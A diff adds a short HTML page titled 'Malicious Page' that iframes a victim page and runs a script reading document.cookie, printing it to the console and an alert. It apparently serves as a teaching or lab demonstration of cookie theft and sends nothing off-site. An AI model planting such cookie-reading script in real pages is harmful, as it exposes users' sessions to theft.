@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Malicious Page</h1>
+    <iframe src="victim.html"></iframe>
+    <script>
+        const stolenCookie = document.cookie;
+
+        console.log("I gots a cookie!: " + stolenCookie);
+        alert("I gots your cookie!: " + stolenCookie);
+    </script>
+</body>
+</html>
